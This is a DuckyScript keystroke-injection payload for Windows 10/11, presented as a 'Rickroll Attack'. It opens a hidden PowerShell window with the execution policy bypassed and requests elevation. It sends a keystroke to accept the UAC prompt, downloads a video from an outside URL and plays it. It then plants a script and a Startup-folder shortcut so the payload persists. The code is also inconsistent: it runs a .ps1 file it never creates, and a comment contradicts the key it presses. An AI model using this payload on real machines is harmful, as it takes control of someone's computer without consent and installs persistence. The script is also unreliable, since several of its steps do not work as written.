REM Author: Pentestersploit/Adrilaw
REM Github: https://github.com/Adrilaw
REM Xda-developer: @Kidpentester
REM Title: Windows Rickroll Attack
REM Description: Starts a powershell to download the rickroll song and execute the downloaded file
REM Target: Windows 10/11
REM Version: 1.2

REM start of script
REM
REM let the HID enumerate
DELAY 500
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\rickroll.ps1' -Verb RunAs"
ENTER
DELAY 1000

REM Handling UAC Prompt: TAB + ENTER to select "Yes"
DELAY 500
ALT y
DELAY 500

REM Download and create the Rickroll script
STRING $down = New-Object System.Net.WebClient; $url = 'https://repo.library.stonybrook.edu/xmlui/bitstream/handle/11401/9656/rickroll.mp4?sequence=1&isAllowed=y'; $file = 'C:\Windows\Temp\rickroll.mp4'; $down.DownloadFile($url, $file);
ENTER
DELAY 1000
STRING Add-Type -AssemblyName presentationCore, presentationFramework; [system.windows.media.mediaplayer]$player = New-Object system.windows.media.mediaplayer; $player.open('C:\Windows\Temp\rickroll.mp4'); $player.Play();
ENTER
DELAY 1000

REM Save the script to Temp folder for persistence
STRING $wscript = 'C:\Windows\Temp\startRickroll.ps1'; 'Add-Type -AssemblyName presentationCore, presentationFramework; [system.windows.media.mediaplayer]$player = New-Object system.windows.media.mediaplayer; $player.open(''C:\Windows\Temp\rickroll.mp4''); $player.Play()' > $wscript;
ENTER
DELAY 1000

REM Create a shortcut in the Startup folder to make it persistent
STRING $shortcut = $env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\rickroll.lnk'; $ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut($shortcut); $sc.TargetPath = 'powershell.exe'; $sc.Arguments = '-ExecutionPolicy Bypass -File C:\Windows\Temp\startRickroll.ps1'; $sc.Save();
ENTER

